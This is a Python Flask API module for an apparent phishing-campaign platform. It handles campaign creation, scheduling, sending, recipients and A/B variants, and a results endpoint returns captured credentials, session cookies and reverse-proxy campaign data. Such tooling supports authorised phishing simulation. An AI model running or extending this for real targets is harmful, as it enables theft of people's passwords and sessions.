import json
from datetime import datetime

from flask import Blueprint, g, jsonify, request, render_template, flash, redirect, url_for

from dropoutjeep_lib import db
from dropoutjeep_lib.models import (
    Campaign, CampaignVersion, CampaignVariant, Recipient, Event, CapturedCredential,
    CapturedCookie, CampaignJob, SendingProfile,
)
from dropoutjeep_lib.utils.auth import viewer_required, operator_required, api_token_required
from dropoutjeep_lib.utils.dialer import Dialer
from dropoutjeep_lib.utils.funnel import compute_funnel
from dropoutjeep_lib.utils.risk import recipient_risk_score
from dropoutjeep_lib.utils.validator import validate_campaign_before_launch
from dropoutjeep_lib.utils.ab_testing import get_variants, variant_funnel, variant_html

campaigns_bp = Blueprint('campaigns', __name__, url_prefix='/api/v1/campaigns')


def _is_admin() -> bool:
    user = getattr(g, 'current_user', None)
    return bool(user and user.role == 'admin')


def _set_flow_config(campaign: Campaign, value):
    if isinstance(value, dict):
        campaign.set_flow_config(value)
    else:
        campaign.flow_config = value


def _campaign_to_dict(c: Campaign) -> dict:
    return {
        'id': c.id,
        'name': c.name,
        'subject': c.subject,
        'body_html': c.body_html,
        'landing_html': c.landing_html,
        'sending_profile_id': c.sending_profile_id,
        'flow_type': c.flow_type,
        'flow_config': c.get_flow_config(),
        'parent_campaign_id': c.parent_campaign_id,
        'created_at': c.created_at.isoformat() if c.created_at else None,
    }


def _result_forbidden():
    return jsonify({'error': 'forbidden'}), 403


@campaigns_bp.route('/', methods=['GET'])
@api_token_required('campaigns:read')
@viewer_required
def list_campaigns():
    campaigns = Campaign.query.order_by(Campaign.created_at.desc()).all()
    return jsonify([
        {"id": c.id, "name": c.name, "subject": c.subject,
         "sending_profile_id": c.sending_profile_id, "created_at": c.created_at,
         "parent_campaign_id": c.parent_campaign_id}
        for c in campaigns
    ])


@campaigns_bp.route('/', methods=['POST'])
@api_token_required('campaigns:write')
@operator_required
def create_campaign():
    data = request.get_json() or request.form
    flow_type = data.get('flow_type', 'single_step')
    if flow_type == 'reverse_proxy' and not _is_admin():
        return jsonify({'error': 'reverse_proxy campaigns require admin role'}), 403
    new_c = Campaign(
        name=data['name'],
        subject=data.get('subject', ''),
        body_html=data.get('body_html', data.get('template_html', '')),
        template_html=data.get('template_html', data.get('body_html', '')),
        landing_html=data.get('landing_html', ''),
        sending_profile_id=data.get('sending_profile_id'),
        flow_type=flow_type,
    )
    _set_flow_config(new_c, data.get('flow_config'))
    db.session.add(new_c)
    db.session.commit()
    return jsonify({"status": "created", "campaign": _campaign_to_dict(new_c)}), 201


@campaigns_bp.route('/<int:campaign_id>', methods=['GET'])
@api_token_required('campaigns:read')
@viewer_required
def get_campaign(campaign_id):
    c = Campaign.query.get_or_404(campaign_id)
    return jsonify({
        'id': c.id,
        'name': c.name,
        'subject': c.subject,
        'body_html': c.body_html,
        'landing_html': c.landing_html,
        'sending_profile_id': c.sending_profile_id,
        'flow_type': c.flow_type,
        'flow_config': c.get_flow_config(),
        'parent_campaign_id': c.parent_campaign_id,
        'created_at': c.created_at.isoformat() if c.created_at else None,
    })


@campaigns_bp.route('/<int:campaign_id>/clone', methods=['POST'])
@api_token_required('campaigns:write')
@operator_required
def clone_campaign(campaign_id):
    from dropoutjeep_lib.utils.campaign_clone import clone_campaign as _clone
    data = request.get_json(silent=True) or request.form or {}
    new_campaign = _clone(campaign_id, new_name=data.get('name'), copy_recipients=data.get('copy_recipients', True))
    return jsonify({'status': 'cloned', 'id': new_campaign.id, 'parent_campaign_id': new_campaign.parent_campaign_id}), 201


@campaigns_bp.route('/<int:campaign_id>/versions', methods=['GET'])
@api_token_required('campaigns:read')
@viewer_required
def list_campaign_versions(campaign_id):
    Campaign.query.get_or_404(campaign_id)
    versions = CampaignVersion.query.filter_by(campaign_id=campaign_id) \
        .order_by(CampaignVersion.version_number.desc()).all()
    return jsonify([{
        'id': v.id,
        'version_number': v.version_number,
        'name': v.name,
        'subject': v.subject,
        'notes': v.notes,
        'created_at': v.created_at.isoformat() if v.created_at else None,
    } for v in versions])


@campaigns_bp.route('/<int:campaign_id>/versions', methods=['POST'])
@api_token_required('campaigns:write')
@operator_required
def snapshot_campaign_version(campaign_id):
    from flask import g
    campaign = Campaign.query.get_or_404(campaign_id)
    data = request.get_json(silent=True) or request.form or {}
    version = campaign.snapshot_version(
        user_id=g.current_user.id if g.current_user else None,
        notes=data.get('notes')
    )
    db.session.add(version)
    db.session.commit()
    return jsonify({'status': 'version_created', 'id': version.id, 'version_number': version.version_number}), 201


@campaigns_bp.route('/<int:campaign_id>/versions/<int:version_id>/restore', methods=['POST'])
@api_token_required('campaigns:write')
@operator_required
def restore_campaign_version(campaign_id, version_id):
    from flask import g
    from dropoutjeep_lib.utils.campaign_clone import restore_campaign_version as _restore
    result = _restore(campaign_id, version_id, user_id=g.current_user.id if g.current_user else None)
    return jsonify(result)


@campaigns_bp.route('/<int:campaign_id>/validate', methods=['GET'])
@api_token_required('campaigns:read')
@viewer_required
def validate_campaign(campaign_id):
    result = validate_campaign_before_launch(campaign_id)
    campaign = Campaign.query.get_or_404(campaign_id)
    return render_template("campaign_validate.html", campaign=campaign, result=result)


@campaigns_bp.route('/<int:campaign_id>', methods=['PATCH'])
@api_token_required('campaigns:write')
@operator_required
def update_campaign(campaign_id):
    campaign = Campaign.query.get_or_404(campaign_id)
    data = request.get_json(silent=True) or request.form or {}

    new_flow_type = data.get('flow_type')
    if new_flow_type:
        if new_flow_type == 'reverse_proxy' and not _is_admin():
            return jsonify({'error': 'reverse_proxy campaigns require admin role'}), 403
        campaign.flow_type = new_flow_type

    if 'name' in data:
        campaign.name = data['name']
    if 'subject' in data:
        campaign.subject = data['subject']
    if 'body_html' in data:
        campaign.body_html = data['body_html']
        campaign.template_html = data['body_html']
    if 'landing_html' in data:
        campaign.landing_html = data['landing_html']
    if 'sending_profile_id' in data:
        campaign.sending_profile_id = data['sending_profile_id']
    if 'flow_config' in data:
        _set_flow_config(campaign, data['flow_config'])

    # Scheduling fields (subset of flow_config / campaign columns).
    for col in ('scheduled_at', 'schedule_cron', 'schedule_timezone', 'schedule_enabled'):
        if col in data:
            if col == 'scheduled_at':
                value = data[col]
                if value:
                    try:
                        value = datetime.fromisoformat(value)
                    except Exception:
                        return jsonify({'error': f'invalid {col} format'}), 400
                setattr(campaign, col, value)
            elif col == 'schedule_enabled':
                setattr(campaign, col, bool(data[col]))
            else:
                setattr(campaign, col, data[col] or None)

    db.session.commit()
    return jsonify({'status': 'updated', 'campaign': _campaign_to_dict(campaign)})


@campaigns_bp.route('/<int:campaign_id>', methods=['DELETE'])
@api_token_required('campaigns:write')
@operator_required
def delete_campaign(campaign_id):
    campaign = Campaign.query.get_or_404(campaign_id)
    db.session.delete(campaign)
    db.session.commit()
    return jsonify({'status': 'deleted', 'id': campaign_id})


@campaigns_bp.route('/<int:campaign_id>/send', methods=['POST'])
@api_token_required('campaigns:write')
@operator_required
def send_campaign(campaign_id):
    campaign = Campaign.query.get_or_404(campaign_id)
    sp = campaign.sending_profile
    rpm = sp.rate_per_minute if sp else 60
    if sp and sp.resolve_rate_profile() and sp.resolve_rate_profile().delay_ms_max:
        rpm = max(1, int(60000.0 / sp.resolve_rate_profile().delay_ms_max))

    dialer = Dialer(db, rate_per_min=rpm)
    ok = dialer.start_campaign(campaign_id)
    if not ok:
        return jsonify({'status': 'no_recipients', 'message': 'No unsent recipients for this campaign'}), 400
    return jsonify({'status': 'started', 'campaign_id': campaign_id})


@campaigns_bp.route('/<int:campaign_id>/stop', methods=['POST'])
@api_token_required('campaigns:write')
@operator_required
def stop_campaign(campaign_id):
    stopped = Dialer.stop_campaign(campaign_id)
    if stopped:
        job = CampaignJob.query.filter_by(campaign_id=campaign_id) \
            .order_by(CampaignJob.started_at.desc()).first()
        if job:
            job.status = 'stopped'
            job.completed_at = datetime.utcnow()
            db.session.commit()
        return jsonify({'status': 'stopped', 'campaign_id': campaign_id})
    return jsonify({'status': 'not_running', 'campaign_id': campaign_id}), 400


@campaigns_bp.route('/<int:campaign_id>/results', methods=['GET'])
@api_token_required('results:read', 'campaigns:read')
@viewer_required
def get_campaign_results(campaign_id):
    """Return funnel, job status, events, credentials, cookies, and risk summary."""
    campaign = Campaign.query.get_or_404(campaign_id)

    # Manual scope OR check: results:read OR campaigns:read.
    token = getattr(g, 'api_token', None)
    if token and not (token.has_scope('results:read') or token.has_scope('campaigns:read')):
        return _result_forbidden()

    job = CampaignJob.query.filter_by(campaign_id=campaign_id) \
        .order_by(CampaignJob.started_at.desc()).first()

    events = Event.query.filter_by(campaign_id=campaign_id) \
        .order_by(Event.created_at.desc()).limit(500).all()

    credentials = CapturedCredential.query.filter_by(campaign_id=campaign_id) \
        .order_by(CapturedCredential.captured_at.desc()).all()

    cookies = CapturedCookie.query.filter_by(campaign_id=campaign_id) \
        .order_by(CapturedCookie.captured_at.desc()).all()

    recipients = Recipient.query.filter_by(campaign_id=campaign_id).all()
    risk_summary = [
        {
            'recipient_id': r.id,
            'email': r.email,
            **recipient_risk_score(r.id),
        }
        for r in recipients
    ]

    return jsonify({
        'campaign_id': campaign_id,
        'funnel': compute_funnel(campaign_id),
        'job': {
            'id': job.id if job else None,
            'status': job.status if job else None,
            'total': job.total if job else 0,
            'sent': job.sent if job else 0,
            'failed': job.failed if job else 0,
            'started_at': job.started_at.isoformat() if job and job.started_at else None,
            'completed_at': job.completed_at.isoformat() if job and job.completed_at else None,
        },
        'events': [
            {
                'id': e.id,
                'event_type': e.event_type,
                'recipient_id': e.recipient_id,
                'meta': e.meta,
                'created_at': e.created_at.isoformat() if e.created_at else None,
            }
            for e in events
        ],
        'credentials': [
            {
                'id': c.id,
                'credential_type': c.credential_type,
                'field_name': c.field_name,
                'username': c.username,
                'value': c.get_value(),
                'source_path': c.source_path,
                'captured_at': c.captured_at.isoformat() if c.captured_at else None,
            }
            for c in credentials
        ],
        'cookies': [
            {
                'id': c.id,
                'cookie_name': c.cookie_name,
                'cookie_value': c.cookie_value,
                'cookie_domain': c.cookie_domain,
                'cookie_path': c.cookie_path,
                'source': c.source,
                'recipient_token': c.recipient_token,
                'captured_at': c.captured_at.isoformat() if c.captured_at else None,
            }
            for c in cookies
        ],
        'risk_summary': risk_summary,
    })


@campaigns_bp.route('/<int:campaign_id>/recipients', methods=['GET'])
@api_token_required('recipients:read')
@viewer_required
def list_campaign_recipients(campaign_id):
    Campaign.query.get_or_404(campaign_id)
    page = request.args.get('page', 1, type=int)
    per_page = request.args.get('per_page', 100, type=int)
    per_page = max(1, min(per_page, 1000))

    query = Recipient.query.filter_by(campaign_id=campaign_id)
    total = query.count()
    recipients = query.order_by(Recipient.created_at.desc()) \
        .offset((page - 1) * per_page).limit(per_page).all()

    return jsonify({
        'campaign_id': campaign_id,
        'page': page,
        'per_page': per_page,
        'total': total,
        'recipients': [
            {
                'id': r.id,
                'email': r.email,
                'name': r.name,
                'external_id': r.external_id,
                'sent_at': r.sent_at.isoformat() if r.sent_at else None,
                'disposition': r.disposition,
                'created_at': r.created_at.isoformat() if r.created_at else None,
            }
            for r in recipients
        ],
    })


@campaigns_bp.route('/<int:campaign_id>/recipients', methods=['POST'])
@api_token_required('recipients:write')
@operator_required
def add_campaign_recipient(campaign_id):
    Campaign.query.get_or_404(campaign_id)
    data = request.get_json(silent=True) or request.form or {}
    email = (data.get('email') or '').strip()
    if not email:
        return jsonify({'error': 'email is required'}), 400
    r = Recipient(
        campaign_id=campaign_id,
        email=email,
        name=(data.get('name') or '').strip() or None,
        external_id=(data.get('external_id') or '').strip() or None,
    )
    db.session.add(r)
    db.session.commit()
    return jsonify({'status': 'created', 'id': r.id}), 201


@campaigns_bp.route('/<int:campaign_id>/variants', methods=['GET'])
@api_token_required('campaigns:read')
@viewer_required
def list_campaign_variants(campaign_id):
    Campaign.query.get_or_404(campaign_id)
    variants = get_variants(campaign_id)
    return jsonify({
        'campaign_id': campaign_id,
        'variants': [v.to_dict() for v in variants],
    })


@campaigns_bp.route('/<int:campaign_id>/variants', methods=['POST'])
@api_token_required('campaigns:write')
@operator_required
def create_campaign_variant(campaign_id):
    Campaign.query.get_or_404(campaign_id)
    data = request.get_json(silent=True) or request.form or {}
    variant_key = (data.get('variant_key') or '').strip().lower()
    if not variant_key:
        return jsonify({'error': 'variant_key is required'}), 400
    existing = CampaignVariant.query.filter_by(campaign_id=campaign_id, variant_key=variant_key).first()
    if existing:
        return jsonify({'error': 'variant_key already exists'}), 409
    v = CampaignVariant(
        campaign_id=campaign_id,
        variant_key=variant_key,
        name=data.get('name', variant_key),
        body_html=data.get('body_html', ''),
        landing_html=data.get('landing_html', ''),
        weight=int(data.get('weight', 1)),
    )
    db.session.add(v)
    db.session.commit()
    return jsonify({'status': 'created', 'variant': v.to_dict()}), 201


@campaigns_bp.route('/<int:campaign_id>/variants/<variant_key>', methods=['GET'])
@api_token_required('campaigns:read')
@viewer_required
def get_campaign_variant(campaign_id, variant_key):
    Campaign.query.get_or_404(campaign_id)
    v = CampaignVariant.query.filter_by(campaign_id=campaign_id, variant_key=variant_key).first_or_404()
    return jsonify({
        'id': v.id,
        'variant_key': v.variant_key,
        'name': v.name,
        'body_html': v.body_html,
        'landing_html': v.landing_html,
        'weight': v.weight,
    })


@campaigns_bp.route('/<int:campaign_id>/variants/<variant_key>', methods=['DELETE'])
@api_token_required('campaigns:write')
@operator_required
def delete_campaign_variant(campaign_id, variant_key):
    Campaign.query.get_or_404(campaign_id)
    v = CampaignVariant.query.filter_by(campaign_id=campaign_id, variant_key=variant_key).first_or_404()
    db.session.delete(v)
    db.session.commit()
    return jsonify({'status': 'deleted', 'variant_key': variant_key})


@campaigns_bp.route('/<int:campaign_id>/variants/funnel')
@api_token_required('campaigns:read')
@viewer_required
def campaign_variants_funnel(campaign_id):
    Campaign.query.get_or_404(campaign_id)
    return jsonify({
        'campaign_id': campaign_id,
        'funnel_by_variant': variant_funnel(campaign_id),
    })
